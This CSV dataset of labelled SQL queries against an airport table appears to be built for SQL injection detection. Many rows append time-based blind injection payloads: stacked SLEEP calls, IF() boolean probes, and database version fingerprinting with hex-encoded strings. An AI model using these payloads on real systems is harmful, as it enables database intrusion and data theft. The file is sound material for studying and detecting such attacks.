full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24);SELECT SLEEP(5)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24));SELECT SLEEP(5)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24)));SELECT SLEEP(5)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT SLEEP(5)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT SLEEP(0)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT SLEEP(5)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((45=45),SLEEP(5),8393)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((45=67),SLEEP(5),4082)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((45=90),SLEEP(5),2373)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((90=67),SLEEP(5),4099)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((67=67),SLEEP(5),9953)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((90 67),SLEEP(5),3490)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((11=11),SLEEP(5),8457)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((11=41),SLEEP(5),1998)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((11=47),SLEEP(5),4458)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((47=41),SLEEP(5),8057)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((41=41),SLEEP(5),7712)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((47 41),SLEEP(5),1298)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((24=24),SLEEP(5),1560)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((24=30),SLEEP(5),9134)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((24=69),SLEEP(5),1927)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((69=30),SLEEP(5),4756)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((30=30),SLEEP(5),4107)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((69 30),SLEEP(5),7491)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((51=51),SLEEP(5),6649)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((51=68),SLEEP(5),6515)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((51=87),SLEEP(5),6479)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((87=68),SLEEP(5),6177)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((68=68),SLEEP(5),5944)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((87 68),SLEEP(5),7207)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((13=13),SLEEP(5),8561)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((13=77),SLEEP(5),6493)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((13=88),SLEEP(5),9683)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((88=77),SLEEP(5),8456)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((77=77),SLEEP(5),6634)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((88 77),SLEEP(5),4117)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((8053=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                8053),SLEEP(5),3853)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((5981>5980),SLEEP(5),2500)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((QUARTER(NULL XOR NULL) IS NULL),SLEEP(5),8013)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((SESSION_USER() LIKE USER()),SLEEP(5),5708)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((ISNULL(JSON_STORAGE_FREE(NULL))),SLEEP(5),3359)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((VERSION() LIKE 0x254d61726961444225),SLEEP(1),7414)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((VERSION() LIKE 0x255469444225),SLEEP(1),6952)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((@@VERSION_COMMENT LIKE 0x256472697a7a6c6525),SLEEP(1),3599)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((@@VERSION_COMMENT LIKE 0x25506572636f6e6125),SLEEP(1),4787)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((AURORA_VERSION() LIKE 0x25),SLEEP(1),5621)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((2579=2579/* NoValue */),SLEEP(1),2579)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((7937=7937/*!80300 AND 4203=8904*/),SLEEP(1),7937)#",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24;SELECT IF((3300=3300/*!80302 AND 9051=5476*/),SLEEP(1),3300)#",1,airport-S2,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""(,).(.)',""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'HfgIrv<'"">tKQdIX""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport');SELECT SLEEP(5)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport';SELECT SLEEP(5)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT SLEEP(5)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT SLEEP(0)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT SLEEP(5)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((75=75),SLEEP(5),1813)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((75=93),SLEEP(5),3529)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((75=95),SLEEP(5),5093)#""",1,airport-S3,Unknown,Unknown
